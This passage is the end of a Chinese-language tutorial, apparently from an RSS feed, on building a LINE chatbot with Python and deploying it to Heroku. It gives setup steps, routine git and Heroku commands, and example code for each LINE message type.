+<li>
+<p>下載 <a href="https://github.com/yaoandy107/line-bot-tutorial/archive/master.zip">範例程式碼</a></p>
+</li>
+<li>
+<p>進入 <a href="https://developers.line.me/console/">Line 控制台</a>，選擇你剛剛創建的機器人</p>
+<p><img src="https://i.imgur.com/6ocsOBW.png" alt=""></p>
+</li>
+<li>
+<p>開啟 webhook</p>
+<p><img src="https://i.imgur.com/nxvFPB1.png" alt="">
+<img src="https://i.imgur.com/PzEKzdq.png" alt=""></p>
+</li>
+<li>
+<p>關閉預設罐頭回覆訊息</p>
+<p><img src="https://i.imgur.com/nXPRhT4.png" alt=""></p>
+</li>
+<li>
+<p>產生 <strong>Channel access token</strong></p>
+<p><img src="https://i.imgur.com/QyxnpZB.png" alt="">
+<img src="https://i.imgur.com/quYbPx9.png" alt=""></p>
+</li>
+<li>
+<p>取得 <strong>Channel access token</strong></p>
+<p><img src="https://i.imgur.com/C7OTect.png" alt=""></p>
+</li>
+<li>
+<p>取得 <strong>Channel secret</strong></p>
+<p><img src="https://i.imgur.com/IwmvyzL.png" alt=""></p>
+</li>
+<li>
+<p>使用編輯器開啟範例程式碼資料夾內的 app.py，將剛剛取得的 <strong>channel secret</strong> 和 <strong>channel access token</strong> 填入</p>
+<p><img src="https://i.imgur.com/Uz16joi.png" alt=""></p>
+</li>
+</ol>
+<h2 id="將程式推到-heroku-上">將程式推到 Heroku 上</h2>
+<ol>
+<li>
+<p>下載並安裝 <a href="https://devcenter.heroku.com/articles/heroku-cli">Heroku CLI</a>、<a href="https://git-scm.com/">Git</a></p>
+</li>
+<li>
+<p>開啟剛剛下載的範例程式碼資料夾，在路徑上輸入 cmd</p>
+</li>
+<li>
+<p>使用終端或命令行應用程序登錄到 Heroku</p>
+<pre><code class="language-shell＝" data-lang="shell＝">heroku login
+</code></pre></li>
+<li>
+<p>初始化 git</p>
+<pre><code class="language-shell=" data-lang="shell=">git config --global user.name &quot;你的名字&quot;
+git config --global user.email 你的信箱
+</code></pre><p>注意：<strong>你的名字</strong> 和 <strong>你的信箱</strong> 要換成各自的 <strong>名字</strong> 和 <strong>信箱</strong></p>
+</li>
+<li>
+<p>初始化 git</p>
+<pre><code class="language-shell＝" data-lang="shell＝">git init
+</code></pre><p>注意：僅第一次使用時要輸入</p>
+</li>
+<li>
+<p>用 git 將資料夾與 heroku 連接</p>
+<pre><code class="language-shell＝" data-lang="shell＝">heroku git:remote -a {HEROKU_APP_NAME}
+</code></pre><p>注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱</p>
+</li>
+<li>
+<p>輸入以下指令，將程式碼推上 Heroku，<strong>如果有跳出錯誤請重新輸入</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git add .
+git commit -m <span style="color:#e6db74">&#34;Add code&#34;</span>
+git push -f heroku master
+</code></pre></div><p><strong>每當需要更新 Bot 時，請重新輸入上述指令</strong></p>
+</li>
+</ol>
+<h2 id="將-heroku-與-line-綁定">將 Heroku 與 Line 綁定</h2>
+<ol>
+<li>
+<p>進入 <a href="https://developers.line.me/console/">Line 控制台</a>，選擇你剛剛創建的 Bot</p>
+<p><img src="https://i.imgur.com/6ocsOBW.png" alt=""></p>
+</li>
+<li>
+<p>在 webhook URL 中輸入 Heroku 網址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">{</span>HEROKU_APP_NAME<span style="color:#f92672">}</span>.herokuapp.com/callback
+</code></pre></div><p><img src="https://i.imgur.com/EkDhAgb.png" alt="">
+注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱</p>
+</li>
+</ol>
+<h2 id="測試範例成果">測試範例成果</h2>
+<ol>
+<li>
+<p>進入 <a href="https://developers.line.me/console/">Line 控制台</a>，選擇你剛剛創建的 Bot</p>
+<p><img src="https://i.imgur.com/6ocsOBW.png" alt=""></p>
+</li>
+<li>
+<p>通過在控制台的 “Channel settings” 頁面上掃描 QR Code，將您的 Bot 添加到 LINE 的朋友中</p>
+</li>
+<li>
+<p>在 Line 上向您的 Bot 發送文字訊息，並確認它會學你說話</p>
+</li>
+</ol>
+<h2 id="錯誤尋找">錯誤尋找</h2>
+<blockquote>
+<p>當程式遇到問題時，可查看日誌以找出錯誤</p>
+</blockquote>
+<p>要查看您的 Bot 在 Heroku 的日誌，請按照以下步驟。</p>
+<ol>
+<li>
+<p>如果沒登入，請先透過 Heroku CLI 登入</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">heroku login
+</code></pre></div></li>
+<li>
+<p>顯示 app 日誌</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">heroku logs --tail --app <span style="color:#f92672">{</span>HEROKU_APP_NAME<span style="color:#f92672">}</span>
+</code></pre></div><p>注意：{HEROKU_APP_NAME} 是上述步驟2中的應用名稱。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">--tail                     <span style="color:#75715e"># 持續打印日誌</span>
+--app <span style="color:#f92672">{</span>HEROKU_APP_NAME<span style="color:#f92672">}</span>    <span style="color:#75715e"># 指定 App</span>
+</code></pre></div></li>
+</ol>
+<h2 id="程式檔案解說">程式檔案解說</h2>
+<blockquote>
+<p>資料夾裡需含有兩份文件來讓你的程式能在 heroku 上運行</p>
+</blockquote>
+<ul>
+<li>Procfile：heroku 執行命令，web: {語言} {檔案}，這邊語言為 python，要自動執行的檔案為 app.py，因此我們改成 <strong>web: python app.py</strong>。</li>
+<li>requirements.txt：列出所有用到的套件，heroku 會依據這份文件來安裝需要套件</li>
+</ul>
+<h3 id="apppy-主程式">app.py (主程式)</h3>
+<p>可透過修改程式裡的 handle_message() 方法內的程式碼來控制機器人的訊息回覆</p>
+<p><img src="https://i.imgur.com/DNeNbpV.png" alt=""></p>
+<p>新版範例程式碼內附註解
+如想更多了解此程式，可以去研究 Git、Python3、<a href="http://docs.jinkan.org/docs/flask/">Flask 套件</a>、<a href="https://github.com/line/line-bot-sdk-python">Line bot sdk</a></p>
+<h2 id="進階操作">進階操作</h2>
+<p><a href="https://github.com/line/line-bot-sdk-python#api">官方文件</a></p>
+<h3 id="回覆訊息">回覆訊息</h3>
+<p>只有當有訊息傳來，才能回覆訊息</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">line_bot_api<span style="color:#f92672">.</span>reply_message(reply_token, <span style="color:#960050;background-color:#1e0010">訊息物件</span>)
+</code></pre></div><h3 id="主動傳送訊息">主動傳送訊息</h3>
+<p>Bot 需要有開啟 push 功能才可以做，否則程式會出錯</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">line_bot_api<span style="color:#f92672">.</span>push_message(push_token, <span style="color:#960050;background-color:#1e0010">訊息物件</span>)
+</code></pre></div><h2 id="訊息物件分類">訊息物件分類</h2>
+<p><a href="https://developers.line.me/en/docs/messaging-api/message-types/">官方文件</a></p>
+<p>修改範例程式碼中， handle_message() 方法內的程式碼，可實現多種功能</p>
+<h3 id="textsendmessage-文字訊息">TextSendMessage （文字訊息）</h3>
+
+    <img src="https://i.imgur.com/LieCFAb.png"  alt="TextSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> TextSendMessage(text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Hello, world&#39;</span>)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="imagesendmessage圖片訊息">ImageSendMessage（圖片訊息）</h3>
+
+    <img src="https://i.imgur.com/RaH7gqo.png"  alt="ImageSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> ImageSendMessage(
+    original_content_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/original.jpg&#39;</span>,
+    preview_image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/preview.jpg&#39;</span>
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="videosendmessage影片訊息">VideoSendMessage（影片訊息）</h3>
+
+    <img src="https://i.imgur.com/o6cvf3o.png"  alt="VideoSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> VideoSendMessage(
+    original_content_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/original.mp4&#39;</span>,
+    preview_image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/preview.jpg&#39;</span>
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="audiosendmessage音訊訊息">AudioSendMessage（音訊訊息）</h3>
+
+    <img src="https://i.imgur.com/w5szZag.png"  alt="AudioSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> AudioSendMessage(
+    original_content_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/original.m4a&#39;</span>,
+    duration<span style="color:#f92672">=</span><span style="color:#ae81ff">240000</span>
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="locationsendmessage位置訊息">LocationSendMessage（位置訊息）</h3>
+
+    <img src="https://i.imgur.com/tXE7Aus.png"  alt="LocationSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> LocationSendMessage(
+    title<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;my location&#39;</span>,
+    address<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Tokyo&#39;</span>,
+    latitude<span style="color:#f92672">=</span><span style="color:#ae81ff">35.65910807942215</span>,
+    longitude<span style="color:#f92672">=</span><span style="color:#ae81ff">139.70372892916203</span>
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="stickersendmessage貼圖訊息">StickerSendMessage（貼圖訊息）</h3>
+
+    <img src="https://i.imgur.com/7x0mgK1.png"  alt="StickerSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> StickerSendMessage(
+    package_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>,
+    sticker_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="imagemapsendmessage-組圖訊息">ImagemapSendMessage （組圖訊息）</h3>
+
+    <img src="https://i.imgur.com/MoSf2D6.png"  alt="ImagemapSendMessage"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> ImagemapSendMessage(
+    base_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/base&#39;</span>,
+    alt_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this is an imagemap&#39;</span>,
+    base_size<span style="color:#f92672">=</span>BaseSize(height<span style="color:#f92672">=</span><span style="color:#ae81ff">1040</span>, width<span style="color:#f92672">=</span><span style="color:#ae81ff">1040</span>),
+    actions<span style="color:#f92672">=</span>[
+        URIImagemapAction(
+            link_uri<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/&#39;</span>,
+            area<span style="color:#f92672">=</span>ImagemapArea(
+                x<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, y<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, width<span style="color:#f92672">=</span><span style="color:#ae81ff">520</span>, height<span style="color:#f92672">=</span><span style="color:#ae81ff">1040</span>
+            )
+        ),
+        MessageImagemapAction(
+            text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hello&#39;</span>,
+            area<span style="color:#f92672">=</span>ImagemapArea(
+                x<span style="color:#f92672">=</span><span style="color:#ae81ff">520</span>, y<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, width<span style="color:#f92672">=</span><span style="color:#ae81ff">520</span>, height<span style="color:#f92672">=</span><span style="color:#ae81ff">1040</span>
+            )
+        )
+    ]
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="templatesendmessage---buttonstemplate-按鈕介面訊息">TemplateSendMessage - ButtonsTemplate （按鈕介面訊息）</h3>
+
+    <img src="https://i.imgur.com/41lXWjP.png"  alt="ButtonsTemplate"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> TemplateSendMessage(
+    alt_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Buttons template&#39;</span>,
+    template<span style="color:#f92672">=</span>ButtonsTemplate(
+        thumbnail_image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/image.jpg&#39;</span>,
+        title<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Menu&#39;</span>,
+        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Please select&#39;</span>,
+        actions<span style="color:#f92672">=</span>[
+            PostbackTemplateAction(
+                label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text&#39;</span>,
+                data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=1&#39;</span>
+            ),
+            MessageTemplateAction(
+                label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message text&#39;</span>
+            ),
+            URITemplateAction(
+                label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;uri&#39;</span>,
+                uri<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/&#39;</span>
+            )
+        ]
+    )
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="templatesendmessage---confirmtemplate確認介面訊息">TemplateSendMessage - ConfirmTemplate（確認介面訊息）</h3>
+
+    <img src="https://i.imgur.com/U8NDhrt.png"  alt="ConfirmTemplate"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> TemplateSendMessage(
+    alt_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Confirm template&#39;</span>,
+    template<span style="color:#f92672">=</span>ConfirmTemplate(
+        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Are you sure?&#39;</span>,
+        actions<span style="color:#f92672">=</span>[
+            PostbackTemplateAction(
+                label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text&#39;</span>,
+                data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=1&#39;</span>
+            ),
+            MessageTemplateAction(
+                label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message text&#39;</span>
+            )
+        ]
+    )
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="templatesendmessage---carouseltemplate">TemplateSendMessage - CarouselTemplate</h3>
+
+    <img src="https://i.imgur.com/982Glgo.png"  alt="CarouselTemplate"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> TemplateSendMessage(
+    alt_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Carousel template&#39;</span>,
+    template<span style="color:#f92672">=</span>CarouselTemplate(
+        columns<span style="color:#f92672">=</span>[
+            CarouselColumn(
+                thumbnail_image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/item1.jpg&#39;</span>,
+                title<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this is menu1&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;description1&#39;</span>,
+                actions<span style="color:#f92672">=</span>[
+                    PostbackTemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback1&#39;</span>,
+                        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text1&#39;</span>,
+                        data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=1&#39;</span>
+                    ),
+                    MessageTemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message1&#39;</span>,
+                        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message text1&#39;</span>
+                    ),
+                    URITemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;uri1&#39;</span>,
+                        uri<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/1&#39;</span>
+                    )
+                ]
+            ),
+            CarouselColumn(
+                thumbnail_image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/item2.jpg&#39;</span>,
+                title<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this is menu2&#39;</span>,
+                text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;description2&#39;</span>,
+                actions<span style="color:#f92672">=</span>[
+                    PostbackTemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback2&#39;</span>,
+                        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text2&#39;</span>,
+                        data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=2&#39;</span>
+                    ),
+                    MessageTemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message2&#39;</span>,
+                        text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;message text2&#39;</span>
+                    ),
+                    URITemplateAction(
+                        label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;uri2&#39;</span>,
+                        uri<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/2&#39;</span>
+                    )
+                ]
+            )
+        ]
+    )
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div><h3 id="templatesendmessage---imagecarouseltemplate">TemplateSendMessage - ImageCarouselTemplate</h3>
+
+    <img src="https://i.imgur.com/2ys1qqc.png"  alt="ImageCarouselTemplate"  class="left"  style="width: 250px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> TemplateSendMessage(
+    alt_text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ImageCarousel template&#39;</span>,
+    template<span style="color:#f92672">=</span>ImageCarouselTemplate(
+        columns<span style="color:#f92672">=</span>[
+            ImageCarouselColumn(
+                image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/item1.jpg&#39;</span>,
+                action<span style="color:#f92672">=</span>PostbackTemplateAction(
+                    label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback1&#39;</span>,
+                    text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text1&#39;</span>,
+                    data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=1&#39;</span>
+                )
+            ),
+            ImageCarouselColumn(
+                image_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://example.com/item2.jpg&#39;</span>,
+                action<span style="color:#f92672">=</span>PostbackTemplateAction(
+                    label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback2&#39;</span>,
+                    text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postback text2&#39;</span>,
+                    data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;action=buy&amp;itemid=2&#39;</span>
+                )
+            )
+        ]
+    )
+)
+line_bot_api<span style="color:#f92672">.</span>reply_message(event<span style="color:#f92672">.</span>reply_token, message)
+</code></pre></div>]]></content></item></channel></rss>
